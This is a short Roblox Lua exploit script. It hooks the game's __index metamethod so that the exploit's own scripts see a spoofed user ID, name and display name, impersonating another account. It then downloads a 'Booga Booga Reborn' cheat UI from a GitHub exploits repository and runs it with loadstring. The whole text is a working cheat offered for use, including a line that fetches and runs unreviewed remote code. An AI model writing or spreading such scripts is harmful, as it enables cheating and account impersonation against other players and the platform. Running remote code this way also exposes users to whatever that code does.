local USER = 'dog4aday'
local DISP_NAME = 'Ven0m'
local USER_ID = 408399177
local PLAYER = game.Players.LocalPlayer

local old_index
old_index = hookmetamethod(game, '__index', function(obj, key)
   if obj == PLAYER and checkcaller() then
       if (key == 'UserId' or key == 'userId') then
           return USER_ID
       elseif key == 'Name' then
           return USER
       elseif key == 'DisplayName' then
           return DISP_NAME
       end
   end
   return old_index(obj, key)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/KingImanSlayer05/Roblox-Exploits/main/Booga%20Booga%20Reborn%20T-rex%20UI%20Loadstring", true))()
